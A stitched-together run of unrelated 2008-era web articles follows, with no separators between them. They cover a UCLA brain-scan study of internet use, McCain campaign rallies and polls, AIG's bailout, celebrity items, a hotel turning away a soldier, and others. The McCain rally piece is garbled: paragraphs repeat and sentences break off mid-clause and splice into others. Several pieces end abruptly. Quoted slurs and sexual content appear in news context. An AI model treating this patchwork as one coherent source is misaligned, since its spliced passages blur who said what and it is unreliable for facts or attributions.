“ The study results are encouraging , that emerging computerized technologies may have physiological effects and potential benefits for middle - aged and older adults , ” said principal investigator Dr. Gary Small , a professor at the Semel Institute for Neuroscience and Human Behavior at UCLA .
“ Internet searching engages complicated brain activity , which may help exercise and improve brain function . ”
The study utilised 24 neurologically normal research volunteers between the ages of 55 and 76 , where half were never exposed to the internet and the rest were familiar with search methods on the internet .
To standardise the study , the participants of the two groups were of similar age , educational level , and gender .
Data was recorded from functional magnetic resonance imaging ( fMRI ) scans which were obtained while the volunteers were asked to perform internet searchers and book - reading tasks .
The scans were able to record subtle brain - circuitry changes and track the strength of cell responses in the brain by assessing the concentration of cerebral blood flow during cognitive tasks .
Functional MRI brain scans show
how searching the Internet dramatically
engages brain neural networks
( in red ) .

During the book reading task all the volunteers , from both sides demonstrated high levels of brain activity in the regions of the temporal , parietal , and occipital lobes , which control language , reading , memory , and visual abilities .
However , internet searches showed a major variation between the two groups .
The web - savvy group also activated the frontal , temporal , and cingulated areas of the brain .
These areas control decision - making and complex reasoning .
The fMRI measures by a unit called a voxel .
Researchers found that the group with previous experience in web searchers had sparked 21,782 voxels , in comparison with 8,646 voxels for the opposite faction .
This indicates an approximately twofold increase in brain activity for the web - familiar group , which might be due to the fact that surfing the web poses choices to be made with search - engine selections .
Compared with just simply reading a book , surfing the web engages important cognitive circuits in the brain .
Dr. Small also said that “ With more time on the internet they may demonstrate the same brain activation patterns as the more experienced group . ”
Researchers noted that additional studies will address both the positive and negative influences of these emerging technologies on the aging brain .
TFOT has previously written about a new treatment thathalts progress of alzheimer ’s called Rember that may slow the progress of mild to moderate Alzheimer ’s disease by 81 % over a year and the n ew “ chatter box , ” a powerful super computer that mimics the part of the brain that controls speech and language functions to better understand what goes wrong after brain damage caused by trauma or stroke .
You can also check out our article about erasing memories made easy where disrupting the brain ’s ability to change , causes loss of the ability to recognize familiar objects .
This research may help improve our understanding of the nature of conditions that harm our memory , such as Alzheimer ’s disease .
Additional information on the team ’s findings can be obtained at UCLA ’s website .

The financial collapse we are seeing all around us may prove to be an economic 9/11 .
That was a security crisis , with security implications .
This is an economic crisis , but its social and security implications are potentially just as severe .
A d v e r t i s e m e n t
In our world , economic strength is power , and until the dust settles from this crisis , we do n’t know where the power will lie .
The international landscape may change radically , and that will mean new risks and new threats .
Any student of history knows that economic turmoil creates instability .
Just think back to the Great Depression of the 1930s , which created the conditions for the resurgence of fascism that culminated in the Second World War .
In the public imagination , economic failure is twinned with political failure .
Dictators and fundamentalists use deprivation to their advantage , tapping into frustration to spark violence and secure loyalty .
We see the consequences of economic insecurity all over the world , from Afghanistan , to Pakistan , to the poorer parts of our own country .
Here in the UK , fundamentalists prey on men and women alienated by widening inequality .

74 Year - Old Japanese Porn Star Still Going
I think all men have a glimmer of hope that when we are in our 70’s and starting to need a little assistance around the house , that we might get a nice hot nurse to come and take care of us .
Some fantasy ’s might even include a little happy time when being helped into bed or getting your sponge bath , but these are just fantasy ’s and cant possibly come true … right ?
Well for 74 year - old Shigeo Tokuda , this is a reality that happens more often than you would think .
Thats because Shigeo is actually a 74 year - old porn star who sometimes performs in roles where he is an elderly man in a home , when a hot nurse who is there to help him out gives him a little more help than normal .
“ Lately I ’m also starring as the main actor in a porn series set in a senior - care home .
The girl that I ’m costarring with might play my son ’s wife , a daughter of a relative that I happen to be looking after , or a helper at one of the care homes . ”
It all started over 20 years ago , when Shigeo wanted to buy a porn video and was embarassed to purchase it at an adult store .
He went to the production company itself and over time became friends with the director .
Shigeo has since performed in over 250 adult films during his over 14 years in the porn film industry .
Although you would think it is the sex that keeps Shigeo coming back for film after film , it is actually the role playing and acting that turns him on the most .
“ I mentioned before that I like films that are set up like TV dramas .
This is partly because I ’ve always had the desire to turn into all sorts of different people .
So personally , I do n’t get off just having sex with somebody .
I continue working in this industry not because I like starring in adult films , but because I am given the opportunity to act in various roles .
The appeal for me is in the fact that I can play different people , not that I can boast about my acting skills .
Consequently , most of the films that I ’m in have a proper plot and narrative . ”
Shigeo has plans to continue moaking more adult films until he feels his health and age become an issue .
“ Right now I do n’t have any illnesses , so I guess I ’ll keep watching my health and at least try to go on until I ’m 80 [ laughs ] . ”

Beckham Housekeepers Busted for Stealing
After working for David andfor 10 years , Eric andhave been taken in for questioning regarding some items that showed up on eBay .
Thanks to Victoria 's mom , who must frequent eBay , some of David 's soccer shoes were listed as auction items .
The couple made bail after Hertfordshire detectives finished questioning the sticky fingered twosome .
June did get a chance to speak to Daily Telegraph and said :
" What is in the papers is fabricated nonsense .
Totally fabricated , 99 % of it is totally untrue . "
Too funny !
What is the 1 % that is true ?
We are guessing the part about them working for the Beckham's .
This does n't sound like a good situation for David and Posh .
If the Emmett 's are found guilty the problem is solved ... they simply ' can ' the crooks .
If they can't prove the allegations , our guess is there will be a lawsuit against the Beckham 's for defamation of character .
The Emmett 's would probably have a hard time selling Victoria 's boots , shown in the photo above .
How would one stand in something without heels ?
If they really wanted to make some cash , they should be selling David 's HOT 2009 calendar - check a preview out here .
Brad Takes on the Unapologetic Democracy - Hater on Tavis Smiley 's Radio Show
PLUS : Taking on John Fund , Another GOP ' Voter Fraud ' Scammer , on the Radio , the Following Day ...
Brad Friedman Byon
10/7/2008 , 1:11 pm PT
Late last week I had the " pleasure " of appearing on Tavis Smiley 's public radio show , along with GOP " voter fraud " zealot and propagandist Hans von Spakovsky , about whom we 've written quite a bit here over the years .
The show was pre-taped last Thursday , ran over the weekend , and will continue to be available at Smiley 's website throughout the week .
The audio discussion , which became rather heated at times , is posted at the end of this article .
In his introduction , Smiley credits von Spakovsky as being " from the Heritage Foundation . "
But in addition to being funded by those unapologetic Republicanists , it goes unnoted that vS , a former chair of the FEC , recess - appointed by Bush , then blocked by the Democrats in the Senate when his appointment came up again , was formerly embedded in the Bush DoJ 's wholly - politicized Civil Rights Division voting section .
At the DoJ , he helped to deconstruct the beloved Voting Rights
Act of 1965 by , among other things , pushing through polling place Photo ID restrictions in places such as Georgia , against the advice of just about every career employee in the division .
( The law was later found to be an " unconstitutional day poll tax " by the courts , but ultimately allowed by a higher court , and still under challenge by Democrats in the state . )
He was also instrumental in bringing phony " voter fraud " charges , such as those against ACORN workers in Missouri , filed just days before the razor - thin 2006 Senate election , in violation of the DoJ 's own written rules against bringing such indictments just prior to elections where they are likely to affect the race .
Perhaps even more noteworthy , but unmentioned by Smiley , is that even with all of that , the disgraced von Spakovsky has been secretly hired , at tax - payer expense , as a consultant for Bush 's similarly compromised , and now ironically - named , U.S. Commission on Civil Rights , to help monitor the job that the DoJ will ( or wo n't ) be doing to monitor the 2008 general election .
In any case , vS remains an unapologetic democracy hater , hell - bent on keeping Democratic - leaning voters away from the polls and , as you 'll note during the interview , a liar .
Normally , however , he 's not faced with anybody who can actually call him on his bullshit .
That was n't the case this time , as I was there , and was able to do exactly that ...
Just one of the lies he was called on during the interview was his claim that a recent Michigan Messenger article , detailing the Macomb County , MI , GOP party chair 's claim that they plan to use home foreclosure lists to challenge voters at the polls , was retracted by the paper .
" Michigan Messenger , who made that claim , has now issued a retraction , " and said that " apparently they got the story wrong , " von Spakovsky baldly prevaricated during the show .
Fortunately , both I and Barbara Arnwine of the National Lawyers Committee ( sponsors of the 866 - OUR - VOTE hotline ) , were there to call him on that lie .
That usually does n't happen on public radio .
For the record , the story was most definitely not retracted .
And just to make certain I had n't missed something , I checked yesterday with Michigan Messenger 's national editor Jefferson Morley who confirmed via email : " No , we did not retract anything in the article .
We stand by the reporting in the published story 100 percent . "
vS goes on to try and offer more BS , and the 25 - minute conversation continues to get more and more heated as it moves forward , particularly in the second segment .
Enjoy ...

P.S....
The BRAD BLOG 's tireless comment hostess , " Agent 99 " even approved of my appearance with vS , for a change , noting at her own blog : " Brad Friedman blew him off the airwaves .
It was beautiful !
I stood up and cheered and ran around my living room pumping my fist ! "
P.P.S.... On Friday , by the way , the day after my recorded appearance with vS , I took on yet another unapologetic GOP " voter fraud " scammer / liar --- the Wall Street Journal 's John Fund --- on the radio .
I 'll try to write a bit more about that later , but if you 'd like to listen to that aborted adventure ( he hung up after the first commercial break , also apparently unused to facing anybody able to call him on his bullshit , and too cowardly to stick around to continue to try and make his phony case ) , from last week 's Peter B.

By By Stephen Dohnberg Oct 12 , 2008 in Politics Is Sen. John McCain 's presidential campaign sending mixed messages to supporters and fueling a deeper , more intense culture war in America ?
Standing in the middle of Town Hall Meetings may reveal this answer to you .
McCain quickly retrieved the microphone from another supporter who proclaimed of Obama “ I have read about him , and he ’s an Arab ” to which Sen McCain responded , “ no ma’am , he 's decent family man , citizen , who I just happen to have disagreements on on fundamental issues and that ’s what this campaign is all about ” McCain ’s campaign strategy may have let a genie out of a bottle , after McCain campaign adviser , Greg Strimple , told the After the Oct. 10 Lakeville rally , in a live streaming cell phone interview after the rally with Adam Aigner of NBC News , CNN ’s Dana Bash of CNN .
and Uptake .
Org reporter Noah Kunin ( who also filmed the scrum ) , the supporter who had declared Obama an “ Arab ” revealed that she had originally received similar literature from “ research ” she had done at her local library in Shakopee , MN and had received additional information from a fellow McCain supporter from Burnsville who she said “ sent me more things about Obama . ”
The supporter , identifying herself as Gayle Quinnell , confirmed to Kunin that she was a volunteer at “ McCain Headquarters in Burnsville ” and notified Aigner that she had circulated literature informing people that Obama was a “ Muslim ” and had “ sent out 400 letters . ”
Quinnell continued “ I went to Kinkos and I got them all printed out .
And I sent about 400 letters .
I went in the telephone book and sent them out to people .
So they can decide if they would want Obama . ”
Even as reporters Aigner and Bash protested to Quinell , she insisted “ Yeah , but he ’s still got Muslim in him .
So that ’s still part of him .
I got all the stuff from the library and I could send you all kinds of stuff on him . ”
McCain ’s public reproach to Quinnell seemed to have had no effect on her insistence on Obama ’s heritage and she doubted it would change the minds of others .
As Aigner asked , “ Then do you feel there are a lot of volunteers for McCain who feel that way ? ” and if she fears that the United States would become a “ Muslim country ” Quinell confirmed “ I ’m not alone …
And all the people agree with what I ’m saying to you about Obama . ”
Follow this link to the transcript between Quinnell and reporters .
This particular McCain - Palin rally is not the only one where these fears were expressed or repeated .
Vice presidential candidate Gov. Sarah Palin has mentioned the connection between Sen. Obama and former Weather Underground member William Ayers in recent stump speeches and has been serving as the McCain campaign ’s attack dog .
In doing so , she appears to be drawing an imaginary line between terrorism and Obama .
Video blogs are rife with unreported footage and while many of the blogs are partisan in nature , the footage is no less disturbing .
Footage from one , " bloggerinterrupted " is clearly an Obama supporter , with an Obama logo on his page , and some reasonable rally goers respond to him , “ do n’t put words in my mouth ” , but it ’s not hard to find sites that repeat similar vitriol directed at Sen.
Obama .
In an Oct. 5 rally , Little mainstream media coverage has been offered at this point , although on her Oct 10 broadcast On an Oct. 10 Town Hall meeting with Senator McCain , in Lakeville , MN , as Sen McCain took comments and questions from the audience , he was forced to ask the audience to “ be respectful ” as he said “ I admire Sen Obama and his accomplishments ” .
McCain quelled boos and negative reaction from his call “ for respect ” after one supporter stated “ We ’re scared of an Obama presidency … I ’m concerned about someone who cohorts with domestic terrorists . ”
McCain quickly retrieved the microphone from another supporter who proclaimed of Obama “ I have read about him , and he ’s an Arab ” to which Sen McCain responded , “ no ma’am , he 's decent family man , citizen , who I just happen to have disagreements on on fundamental issues and that ’s what this campaign is all about ” McCain ’s campaign strategy may have let a genie out of a bottle , after McCain campaign adviser , Greg Strimple , told the Washington Post on Oct 4 that they would aim at “ Obama ’s aggressively liberal record and how he will be too risky for Americans .

McCain ’s public reproach to Quinnell seemed to have had no effect on her insistence on Obama ’s heritage and she doubted it would change the minds of others .
As Aigner asked , “ Then do you feel there are a lot of volunteers for McCain who feel that way ? ” and if she fears that the United States would become a “ Muslim country ” Quinell confirmed “ I ’m not alone …
And all the people agree with what I ’m saying to you about Obama . ”
The Uptake.org reporters informed me that they are currently investigating the claim that Quinnell is in fact a volunteer at McCain 's Burnsville HQ .
This particular McCain - Palin rally is not the only one where these fears were expressed or repeated .
Vice presidential candidate Gov. Sarah Palin has mentioned the connection between Sen. Obama and former Weather Underground member William Ayers in recent stump speeches and has been serving as the McCain campaign ’s attack dog .
In doing so , she appears to be drawing an imaginary line between terrorism and Obama .
Video blogs are rife with unreported footage and while many of the blogs are partisan in nature , the footage is no less disturbing .
Footage from one , “ blogger interrupted ” captures footage from an Oct 8 rally in Strongsville , OH .
The Democratic - partisan video blogger focuses on one simple theme in asking “ Do you think Obama is a terrorist ” and is met with responses ranging from “ I think he ( Obama ) is a one man terror cell ” to “ I think he ’s a communist and a marxist … indoctrinated by the teachings of his father . ” " bloggerinterrupted " is clearly an Obama supporter , with an Obama logo on his page , and some reasonable rally goers respond to him , “ do n’t put words in my mouth ” , but it ’s not hard to find sites that repeat similar vitriol directed at Sen. Obama .
In an Oct. 5 rally , CodePink ’s Linda Milazzo reported in an op - ed piece that Palin said of Obama “ this is not a man who sees America as you and I see America . ” and continued “ Our opponent is one who sees America as imperfect enough to pal around with terrorists who targeted their own country .
” Little mainstream media coverage has been offered at this point , although on her Oct 10 broadcast MSNBC ’s Rachel Maddow asks of McCain , “ can he , or anyone , tamp down the flames at this point ? ”

Hotel forced to apologise after it refused wounded British soldier a hotel room ' because he was in the Army '
Apology : The Metro Hotel in Woking , Surrey
The hotel which refused to give a room to a soldier who had been wounded in Afghanistan was forced to make an apology last night .
Corporal Tomos Stringer , 23 , had booked to stay at the Metro Hotel , in Woking , Surrey , while helping organise the funeral of a friend killed in action .
On arrival , reception desk staff asked him for identification and he handed them his military pass .
Corporal Stringer , who was not dressed in uniform at the time , was astonished when they turned him away , claiming it was not company policy to allow Armed Forces personnel to stay at the hotel .
Yesterday the Metro Hotel , owned by American Amusements Ltd , also based in Woking , at first declined to comment .
But after news of Corporal Stringer 's treatment emerged , it was flooded with angry calls from the public and issued an apology , blaming a mistake made by the receptionist on duty .
A spokesman for the hotel said : ' The Metro sincerely apologises for any upset caused towards Corporal Stringer and his family .
' The hotel management has always had an open door policy to all its visitors and guests , including members of the military and Armed Forces , and will continue to do so . '
Turned away : Corporal Tomos Stringer was refused entry to a hotel in Surrey because he works for the military
Last night his mother Gaynor , 60 , criticised the ' outrageous ' treatment of her son .
She has contacted Defence Minister Derek Twigg , who called the hotel 's actions ' deplorable ' .
Mrs Stringer , a volunteer in a charity shop , said : ' It 's a disgraceful way to treat someone who is prepared to give his life for Queen and country .
' Soldiers in America are treated like heroes and get applauded everywhere they go , but our boys are being treated like scum .
' I find it incredible that a hotel is even allowed to effectively ban a customer because of their choice of career – especially when that career is protecting our country . '
Corporal Stringer , who serves with the 3rd Air Assault Support Regiment of the Royal Logistic Corps , based in Colchester , is now back on the frontline , fighting in Helmand province .
He joined the Army at 16 and served in Iraq before being posted to Afghanistan .
He is due to return home from his second tour of the country at the end of the month .
His father Philip , a 79 - year - old retired printer who served three years with the Royal Horse Artillery , called for a change in the law to prevent something similar happening in the future .
Outraged : Gaynor Stringer with a photo of her son Tomos , who is now back in Afghanistan
' My son thought the whole thing was awful , ' he said .
' Had this happened to a Muslim or black person it would , quite rightly , have been discrimination .
It should be the same to turn away someone because he 's a soldier .
' Tomos ended up sleeping in his car with his arm in plaster , which is terrible . '
The incident occurred on June 22 while Corporal Stringer , of Pentrefelin , Criccieth , North Wales , was on four weeks ' recovery leave .
He had broken his wrist jumping from his military wagon when a truck in front hit a roadside bomb .
Doctors sent him home for further treatment after it failed to heal .
While in Britain , he decided to visit a friend to see if he could help with preparations for the funeral of a colleague killed in Afghanistan .
Corporal Stringer made a reservation at the Metro , a £ 60 - a- night budget hotel , but when he went to check in at around 10 pm , dressed in his civvies , he was refused entry .
He asked to see the manager , but staff claimed he was unavailable .
By then it was too late to find another room in the town , so he decided to spend the night in his car outside .
A woman who answered the door at the £ 2 million Surrey home of American Amusements ' director Michael Appleton said : ' Mr Appleton will not be making a comment . '
Sharon Stone is an alarmist parent who has gone off the deep end over and over , according to the judge who rejected her request to move her son down to L.A .
The court has released what it calls the " Tentative Statement of Decision . "
It is a highly sensitive document , which outlines a bitter , ongoing battle between Stone and ex-husband , Phil Bronstein .
Among many things , the judge says , " Mother appears to overreact to many medical issues involving Roan . "
In one case , the judge describes Stone believing Roan had a spinal condition , but " there was no evidence to support this allegation . "
And then the court says , " Another example of an overreaction is that Mother suggested that Roan should have Botox injections in his feet to resolve a problem he had with foot odor .
As Father appropriately noted , the simple and common sense approach of making sure Roan wore socks with his shoes and used foot deodorant corrected the odor problem without the need for any invasive procedure on this young child . "
The judge differentiated very distinctly the difference between Bronstein and Stone , saying , " Father has championed for Roan 's well - being out of , what appears to this Court , nothing less than the unconditional love for his son .
Unfortunately , and for unexplained reasons , it appears that Mother did not involve herself to the extent she could or should have in this process ...
Mother has attempted to put up roadblocks to Roan 's getting help , or has decided against participating in his care . "
The judge goes on : " Unfortunately , the problem caused by Mother 's overreactions is painfully real for this child . "
There are many other specifics that we wo n't publish .
The judge says at one point , responding to Stone 's argument that she put her career on hold for Roan , " If Mother has , in fact , limited her career to make herself available for Roan , she has done little to make this evident to Roan , his school or this Court . "

Greenville , S.C. -- Editor 's Note :
This article was published on Feb. 18 , 2000 .
In 2008 , at least three national web sites posted links to it .
As a result , it appeared in the list of SFGATE 's Most Read articles .
In 2018 , this article once again resurfaced and landed on SFGATE 's Most Read articles , in the wake of Sen. John McCain 's death on Aug. 26 after a battle with brain cancer .
He was 81 .
To read his obituary , head here .
Arizona Sen .
John McCain refused to apologize yesterday for his use of a racial slur to condemn the North Vietnamese prison guards who tortured and held him captive during the war .
" I hate the gooks , " McCain said yesterday in response to a question from reporters aboard his campaign bus .
" I will hate them as long as I live . "
McCain , a former Navy pilot who spent five years in a Vietnamese prisoner of war camp , was questioned about the language because of a story last month in the Nation magazine reporting his continued use of the slur .
Since then , reports of McCain 's language have been circulating on Internet chat sites and e-mails among Asian Americans , many of whom find the the term offensive and inappropriate for an elected official .
McCain 's appeal to voters has been as a wartime hero and a feisty politician who speaks his mind and damns the consequences .
But his comments on the eve of the key South Carolina primary show the candidate 's vaunted " straight talk " in another light .
" The use of a racist slur ca n't be acceptable for any national leader , regardless of his background , " said Diane Chin , executive director of the San Francisco - based Chinese for Affirmative Action .
" For someone running for president not to recognize the power of words is a problem . "
While McCain 's words may have little effect in conservative South Carolina , where few Asian Americans live , they could come back to haunt him in other states .
" Historically , straight talkers who say things off the top of their heads eventually hang themselves with those sorts of remarks , " said Bruce Cain , a political scientist at the University of California at Berkeley .
" While it might not hurt him now , Democrats are not going to have any hesitation about using this stuff to string him up later . "
TERM FOR HIS CAPTORS
McCain made no apologies yesterday .
" I was referring to my prison guards , " McCain said , " and I will continue to refer to them in language that might offend some people because of the beating and torture of my friends . "
McCain made it clear that his anger extends only toward his captors .
As a senator , he was one of the leaders of the postwar effort to normalize U.S. relations with Vietnam .
Campaign officials do not expect the controversy to hurt McCain , either in tomorrow 's South Carolina primary or later in the campaign .
" If people understood the context , they would n't be upset , " Mike Murphy , a senior adviser to the campaign , said last night .
But the racial slur used by the senator has a long , painful history that is felt by many Asian Americans .
The word " gook " was first used in 1899 by American soldiers fighting Filipino insurgents .
During the Korean War , the term was aimed at Koreans and Chinese .
It was directed at the Vietnamese when Americans were fighting in Vietnam .
It is now used as a slur toward any Asian or Pacific Islander .
The Arizona senator prides himself on running an open campaign .
He is surrounded by reporters , television cameras and tape recorders perhaps more than any presidential candidate in history .
Reporters are given full access to the candidate between each campaign stop on a customized bus purposefully dubbed the " Straight Talk Express . "
The bus , which also carries his top staff and often his wife , Cindy , is crammed with network anchors and local newspaper reporters , who endlessly engage McCain in what amounts to a news conference on wheels .
The comments are usually recorded and always on the record .
Sometimes the questions are pointed and serious .
Sometimes they are not .
McCain has declared on his bus , " I hate the French . "
He often begins meetings with Californians joking , " I hate Californians , " noting that they steal Arizona 's water and lure his constituents away in the summer .
MCCAIN'S IMPRISONMENT
But those comments are clearly in jest .
Yesterday 's were not .
McCain was captured after his A - 4 Skyhawk was shot down over Hanoi on Oct. 26 , 1967 .
During the time he was held , he was brutally tortured by his captors , finally reaching the point where he was unable to resist signing a " confession . "
McCain and his fellow prisoners suffered terribly in the prison camp .
In the crowd at yesterday 's rally in Greenville was retired Adm. Robert Fuller , who was in prison with McCain at the infamous " Hanoi Hilton . "
Fuller , who lives in Jacksonville Beach , Fla. , spoke informally of the despair of living in single cells , where the only form of contact was by an ingenious code devised by the prisoners .
Fuller said prisoners were sometimes tortured for as many as six days .
When they returned , he said , the others would send messages of support by tapping on the wall .
" They would be put in ropes for six days , and they would confess , " Fuller said .
" When they came back to their cell , guys would tap on the wall , ' We love you .
I wish we could give you a hug . ' "
The horrors of the past cannot be an excuse for hurting people in the present , said Guy Aoki , president of the Media Action Network for Asian Americans , an anti-defamation group .
" If Sen . McCain had been captured by Nigerians , could he call those people ' niggers ' and think he was n't going to offend everyone who is black ? "
Akoi asked .
" We can all feel for what he went through , but if that 's his level of sensitivity , I 'm very disappointed . "
McCain usually treats his experience as a prisoner of war as a terrible time in his life , but a period he has moved beyond .
At times , he even uses it as a punch line for jokes .
At a pancake breakfast recently , he said he had gone with his daughter to the MTV Music Awards , " and that was the greatest assault on my senses since I was in prison . "
Yesterday 's comments made it clear that McCain had neither forgotten , nor forgiven , his captors .
" I will call right now , my interrogator that tortured me , a gook , " McCain said .
" ( I ca n't believe that ) anybody does n't believe these interrogators and prison guards were cruel and sadistic people who deserve the worst appellations possible . "
McCain said he does not consider the comment an epithet .
" Gook , " he said , " is the kindest appellation I can give . "

Österreich Rechtspopulist Jörg Haider stirbt bei Autounfall

CBS / NYT POLL SHOWS MCCAIN STRATEGY BACKFIRING … .
In recent weeks , the McCain campaign has gone to considerable lengths to change the subject of the campaign away from the economy and towards guilt - by - association attacks .
It now appears McCain badly miscalculated , and misjudged the public ’s expectations .
The McCain campaign ’s recent angry tone and sharply personal attacks on Senator Barack Obama appear to have backfired and tarnished Senator John McCain more than their intended target , the latest New York Times / CBS News poll has found .
After several weeks in which the McCain campaign unleashed a series of strong political attacks on Mr. Obama , trying to tie him to a former 1960s radical , among other things , the poll found that more voters see Mr. McCain as waging a negative campaign than Mr. Obama .
Six in 10 voters surveyed said that Mr. McCain had spent more time attacking Mr. Obama than explaining what he would do as president ; by about the same number , voters said Mr. Obama was spending more of his time explaining than attacking .
Over all , the poll found that if the election were held today , 53 percent of those determined to be probable voters said they would vote for Mr. Obama and 39 percent said they would vote for Mr. McCain .
McCain ’s favorability rating has dropped to 41 % , while , Obama ’s has risen to 50 % , the highest ever in a CBS / NYT poll .
What ’s more , 69 % said Obama has the right kind of temperament and personality to be president , which is 16 points higher than McCain ’s number on the same question .
It was n’t too long ago that a McCain campaign staffer told a reporter that the Republicans would lose if they focused on the economy .
The campaign got it backwards .
Independent voters , in particular , have fled from McCain .
Whereas the last CBS / New York Times poll showed McCain leading Obama among independents by a healthy margin , the new results show a huge swing to the Democrat , who now leads McCain among independents by 18 points , 51 % to 33 % .
Eric Kleefeld went through the poll ’s internals and found another interesting tidbit : “ More registered voters think John McCain would raise their taxes than think Barack Obama would , a sign that the Obama campaign ’s constant assault on McCain ’s health plan — and its taxation of health benefits — has been paying off . ”
This is quite a surprise .
The poll found that a 46 % plurality believes Obama would raise their taxes , while a 51 % majority believes McCain would raise their taxes .
Maybe it ’s the healthcare pushback , or perhaps voters are just convinced that their taxes will have to go up no matter who wins .
Either way , this was a lynchpin of the McCain / Palin strategy , and the message is n’t connecting .

Oct. 10 : This post has been updated .
Both John McCain and Barack Obama took turns during the second presidential debate on Tuesday night claiming credit for having warned of an imminent economic crisis .
Obama has referred frequently to his 2007 letter to Treasury Secretary Henry Paulson .
But Sen. McCain countered by saying that he had written a letter " warning of exactly this crisis . "
As far as we can tell , this was the first reference McCain has made of such a letter , and we could n't find it .
Despite multiple requests , the McCain campaign did not provide comment or the letter .
10/10 Update : The campaign did send the letter .
See it here ( PDF ) .
Obama likes to bring up the letter he wrote to Paulson and Federal Reserve Chairman Ben Bernanke .
Dated March 22 , 2007 , about six weeks after he'd declared his candidacy for the presidency , the letter stressed the need for immediate intervention to curb the " rising rates of home foreclosure in the subprime mortgage market " :
And while neither the government nor the private sector acting alone is capable of quickly balancing the important interests in widespread access to credit and responsible lending , both must act and act quickly .
Crediting the senator with a foresight others lacked , however , would be a stretch .
The subprime mortgage crisis had been well underway for some time .
See , for example , reporting by the New York Times in June 2005 on a growing housing crisis .
A month later the Times wrote of the unease among federal banking regulators with regards to high - risk mortgage loans .
At Tuesday 's debate , McCain added a new detail to his role as an early warrior against bad lending practices by Fannie Mae and Freddie Mac .
Apparently he , too , wrote a letter :
I think if we act effectively -- if we stabilize the housing market , which I believe we can if we go out and buy up these bad loans so that people can have a new mortgage at the new value of their home ; I think if we get rid of the cronyism and special interest influence in Washington so we can act more effectively -- my friend , I 'd like you to see the letter that a group of senators and I wrote warning exactly of this crisis .
Senator Obama 's name was not on that letter .
McCain may have been referring to actions he took in support of the bill he co-sponsored in 2005 -- the Housing Enterprise Regulatory Reform Act -- which called for stricter regulations for Freddie Mac and Fannie Mae .
When he joined as a co-sponsor in May 2006 , about a year after it was first introduced , he made the following statement :
For years I have been concerned about the regulatory structure that governs Fannie Mae and Freddie Mac ... and the sheer magnitude of these companies and the role they play in the housing market ....
If Congress does not act , American taxpayers will continue to be exposed to the enormous risk that Fannie Mae and Freddie Mac pose to the housing market , the overall financial system , and the economy as a whole .
But until we see his letter , we can't be sure .
Adding to the confusion is a statement he made during a November 2007 interview with the New Hampshire Keene Sentinel , which touched on , among other topics , the subprime mortgage crisis :
" I do n't really know of hardly anybody who , with the exception of a handful , that said , wait a minute this thing is getting completely out of hand and is overheating .
So , I 'd like to tell you I did anticipate it , but I have to give you straight talk .
I did not . "
For those interested in reading up on the two candidates ' positions on market reforms , see our complete rundown .
Since mid-September , the government has doled out hundreds of billions in loans .
And so far , the bailout of AIG seems by far the riskiest investment .
First came the $ 85 billion credit line in mid-September to save the company from bankruptcy .
Then came an additional $ 38 billion just weeks later .
Last week , a government report showed that the company was burning through the cash -- it had already borrowed $ 90 billion .
AIG may need even more .
Last week , AIG ’s CEO Edward Liddy , installed as part of the government takeover , appeared on PBS ’ NewsHour .
Asked whether the $ 120 billion would be enough , he answered , " You know , I think so and I sure hope so … .
[ I ]t's possible it may not be enough … .
I think we should be OK . "
AIG ’s former CEO Hank Greenberg , for his part , says he thinks " the taxpayers will not get all their money back . "
So how is AIG burning through its billions ?
As the New York Times reports , some analysts look at AIG 's multiplying losses with suspicion .
The big question mark remains AIG ’s credit - default swap business ( we wrote about that outfit a few weeks ago ) .
The tiny AIG unit , AIG Financial Products , traded in the unregulated derivatives and thus caused the company ’s downfall .
Even after the government takeover , that aspect of AIG ’s business remains murky , the Times reports : " No information has been supplied yet about who these counterparties are , how much collateral they have received or what additional tripwires may require even more collateral if the housing market continues to slide . "
AIG ’s swaps office has a reported $ 447 billion portfolio , which was a huge boon to the company ’s profits in good times .
But given the complexity and obscurity of the portfolio , it has always been a mystery how exposed AIG really is .
Instead of coming clean , AIG has instead gradually admitted higher and higher losses , while stressing that such losses were only paper , theoretical losses and really were n’t as bad as they sounded .
What began as a trickle last year turned into a flood this year .
The latest total , in AIG ’s second quarter statement , was $ 26 billion .
Evidence suggests that what changed was n’t so much the market , but AIG ’s accounting .
An AIG accounting expert , hired specifically to watch over the Financial Products unit , testified in a letter to Congress ( pdf ) that he ’d been blocked from inspecting the unit ’s swaps portfolio .
In March , the former head of that unit , Joseph Cassano , resigned after AIG announced that its auditor PricewaterhouseCoopers had identified problems in AIG ’s accounting .
AIG ’s next quarterly report is due next week , so we ’ll see then whether the assessment of the unit ’s loss has ballooned under new management .
The statistics behind the pay - what - you - like release of Radiohead ‘s ‘ In Rainbows ’ album , released on October 10 last year online , have been revealed today ( October 15 ) .
According to reports most fans chose to pay nothing to download the album .
However , it still generated more money before it was physically released ( on December 31 ) than the total money generated by sales of the band ’s previous album , 2003 ’s ‘ Hail To The Thief ’ .
According to Music Ally , Jane Dyball , head of business affairs at Warner Chappell ( the publishing company that oversaw the release of ‘ In Rainbows ’ ) , refused to reveal the average price people were downloading the album for .

However , Dyball , set to speak about the release at the Iceland Airwaves conference later , explained that Warner Chappell and Radiohead ‘s management were monitoring the average price daily , and was prepared to cancel the download facility if the average price became too low .
The download facility was taken down after three months , and the album went to Number One in the UK and USA after being physically released .
Statistics revealed that most fans downloaded the album through file - sharing service BitTorrent , but that this had been anticipated before the release .
The band sold 100,000 copies of the ‘ In Rainbows ’ box set , which contained extra songs not available on the standard download or CD release .
Warner Chappell concluded that the new release style was a financial success , but did not reveal whether Radiohead plan to release an album in a similar way in the future .

" At McDonald 's we 've got time for you " goes the jingle .
Why then do they design the service so that you 're in and out as soon as possible ?
Why is it so difficult to relax in a McDonald's ?
Why do you feel hungry again so soon after eating a Big Mac ?
We 're all subject to the pressures of stupid advertising , consumerist hype and the fast pace of big city life - but it does n't take any special intelligence to start asking questions about McDonald 's and to realise that something is seriously wrong .
The more you find out about McDonald 's processed food , the less attractive it becomes , as this leaflet will show .
The truth about hamburgers is enough to put you off them for life .

While this article about The Wire deliberately contains as few actual spoilers about the show as possible , it does contain numerous links to pages with information that will tell you critical spoiler information about the stories and fates of the show 's characters .
The article also contains language and links that are very much not safe for work .
Please proceed with caution on all fronts .
In the time since I gallantly announced what makes a good blog , I ’ve had time to think more about the qualities of work that endures .
Not thinking just of personal blogs here , or solely in terms of the ways that we can improve online publishing and social media — although clearly these are areas that could stand some improvement .
I ’m talking about the extent to which some of those qualities that I mentioned in that article relate to broader ideas around all creative work and the process behind how it gets made well and consistently by an auteur who ’s only incidentally a merchant .
And it ’s especially got me thinking about how any thing we choose to make today can contribute to , for lack of a better phrase , an arc .
So , naturally , I ’ve been thinking a lot about The Wire .
